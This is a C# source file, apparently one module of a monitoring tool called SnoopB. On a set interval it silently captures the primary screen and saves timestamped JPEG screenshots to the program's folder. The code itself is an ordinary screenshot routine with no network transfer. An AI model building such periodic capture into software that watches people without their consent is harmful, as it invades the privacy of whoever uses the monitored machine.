using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using SnoopB.Configuration;

namespace SnoopB.Modules.ScreenCapture
{
    /// <summary>
    /// Create a screenshot, in the maind directory
    /// </summary>
    internal class ScreenCaptureModule : Module
    {
        public ScreenCaptureModule(int minutesInterval) : base(minutesInterval)
        {
        }

        #region [ Module ]

        protected override void ExecuteInternal()
        {
            CaptureScreen();
        }

        public new static string ModuleId
        {
            get { return "3713a843-8757-4b5e-a5e0-cdd129d6bfef"; }
        }

        #endregion

        private static void CaptureScreen()
        {
            using (var bmpScreenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            {
                using (var g = Graphics.FromImage(bmpScreenCapture))
                    g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0,
                                     bmpScreenCapture.Size, CopyPixelOperation.SourceCopy);

                bmpScreenCapture.Save(
                    Path.Combine(Configurator.Instance.CurrentExecutionPath,DateTime.Now.ToString("dd-MM-yy--HH-mm-ss") + ".jpeg"),
                    ImageFormat.Jpeg);
            }
        }
    }
}